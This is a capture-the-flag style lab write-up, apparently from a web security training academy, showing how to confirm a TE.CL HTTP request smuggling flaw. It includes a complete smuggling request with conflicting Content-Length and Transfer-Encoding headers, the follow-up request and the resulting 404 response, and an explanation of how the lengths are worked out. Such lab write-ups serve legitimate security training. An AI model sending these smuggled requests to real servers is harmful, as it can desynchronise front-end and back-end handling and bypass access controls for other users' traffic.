## 1. Introduction

Here we want to confirm if the TE.CL vulnerability exists. This means that the frontend processes the Transfer-Encoding and the backend Content-Length.

## 2. Challenge

Challenge is to smuggle a request to the backend server, so that the subsequent request triggers a 404 Not Found response.

## 3. Solution

Attack request:
```http
POST / HTTP/1.1
Host: 0a0e005d0434a64194ef9071002b00db.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5d
GET /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

x=1
0

```

Normal request:
```http
GET / HTTP/1.1
Host: 0a0e005d0434a64194ef9071002b00db.web-security-academy.net
Sec-Ch-Ua: "Chromium";v="131", "Not_A Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
```

Response:
```http
HTTP/1.1 404 Not Found
Content-Type: application/json; charset=utf-8
Set-Cookie: session=tlqdmoalGQBjcttiZBW0R5PsDB2byXDh; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 11

"Not Found"
```

## 4. Explanation

In the attack request we have a Content-Length and a Transfer-Encoding headers, and an additional Content-Length in the Body of the request.

First we have to leave this empty, because they need to be calculated after we craft the request,

Since the frontend uses chunked data, we also need to calculate the size of the chunk and put that in the beginning of the body.

Then we craft the request that we want to smuggle to the backend:
```http
GET /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: ?

x=1
0

```

This is part of the body of the request that we want to send from the frontend, and smuggle in the backend.

The body part here has the size of 10, and since the normal request will be appended here, we need to put the Content-Length, at least one byte more, so we set it to 11.

The chunk size here has the length of 5d(hex) bytes, so we write that above the body.

Since we suppose that the backend processes Content-Length, we need to calculate what is the size of the body, that we want to be processed first by the backend, and that is only until the 5d part, counting also \r\n it means it's 4 bytes.

The backend will process this as a request and the remaining part "GET /404 ..." will be seen from the backend as another request, and will invoke the 404 Not Found.